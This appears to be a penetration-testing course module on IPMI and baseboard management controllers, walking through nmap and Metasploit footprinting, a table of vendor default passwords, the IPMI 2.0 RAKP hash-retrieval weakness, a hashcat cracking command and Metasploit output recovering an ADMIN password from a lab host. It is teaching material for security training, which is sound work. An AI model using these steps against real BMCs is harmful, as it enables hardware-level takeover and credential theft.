`Intelligent Platform Management Interface (IPMI)` is a standardized hardware-level management interface used for remote system monitoring and control. It functions as an independent subsystem separate from the host’s BIOS, CPU, firmware, and operating system. This allows administrators to manage or troubleshoot systems even when they are powered off or unresponsive.

It operates through a direct network connection to the system’s hardware, without requiring OS-level access or user login. `IPMI` enables tasks like remote BIOS configuration, firmware updates, and full system power management.

It is commonly used:

- Before the operating system boots to modify BIOS or firmware settings
- When the host is powered down for remote startup or diagnostics
- After a system failure to perform recovery or analysis
    

Beyond power and configuration control, `IPMI` can monitor system metrics such as temperature, voltage, fan speeds, and power supply status. It also supports querying hardware inventory, retrieving logs, and generating `SNMP` alerts.

For proper functionality, the IPMI controller (typically a `BMC` — Baseboard Management Controller) must have both constant power and a network connection, even if the host system itself is powered off.

The `IPMI` protocol was introduced by Intel in 1998 and has since gained support from more than 200 vendors, including Cisco, Dell, HP, Supermicro, and Intel. Systems running `IPMI` version 2.0 can be managed through **Serial over LAN (SoL)**, allowing administrators to access serial console output remotely over the network.

To operate, `IPMI` requires several core components:

- `Baseboard Management Controller (BMC)` – The microcontroller responsible for managing the system’s sensors, power, and remote control functions. It serves as the foundation of the `IPMI` architecture.
- `Intelligent Chassis Management Bus (ICMB)` – Provides communication between multiple chassis within a system or rack.
- `Intelligent Platform Management Bus (IPMB)` – Extends the `BMC` by enabling communication with additional management controllers or sensors.
- `IPMI Memory` – Stores data such as the system event log, hardware inventory, and repository records.
- `Communication Interfaces` – Include local interfaces, serial and LAN connections, `ICMB`, and the PCI Management Bus, enabling external management and monitoring access.

---

# Footprinting the Service 

`IPMI` communicates over UDP port `623`. Systems that implement `IPMI` are `BMCs` (Baseboard Management Controllers), commonly embedded ARM systems running `Linux` and attached directly to the motherboard; they may be built into the board or provided as a PCI card. Common vendor implementations encountered during internal assessments include `HP iLO`, `Dell iDRAC`, and `Supermicro IPMI`.

If you gain access to a `BMC` you effectively have hardware-level control of the host: monitor sensors, reboot, power off, or reinstall the OS — equivalent to physical access. Many `BMCs` expose a web management console plus remote access protocols such as `SSH` or `Telnet`, and always expose the `IPMI` protocol on `UDP/623`.

```bash
OathBornX@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol.
#### Metasploit Version Scan

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|
Always test known `default passwords` for any discovered services; these are often left unchanged and yield quick access. For `BMCs`, try vendor default credentials to gain the `web console` or command-line access via `SSH` or `Telnet`.

---

# Dangerous Settings

`If default credentials fail for a` BMC`, exploit the` RAKP `weakness` IPMI 2.0`: during authentication the server reveals a salted` SHA1`/`MD5 `derivative of the password which lets you extract an account's password hash. These hashes are crackable offline with` Hashcat `(`mode 7300``) using dictionary or mask attacks.

Example mask attack for an eight-character HP iLO default-style password: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

There is no protocol-level patch because the weakness is inherent to the spec; mitigations are operational: enforce very long, high-entropy passwords and restrict `BMC` network access via segmentation and ACLs.

Do not ignore `IPMI` on internal engagements — it yields high-risk, hardware-level control. Cracked `BMC` credentials are frequently re-used across infrastructure and can directly lead to `SSH` or web-console compromise, lateral access, and full host recovery operations.

To retrieve IPMI hashes, we can use the Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```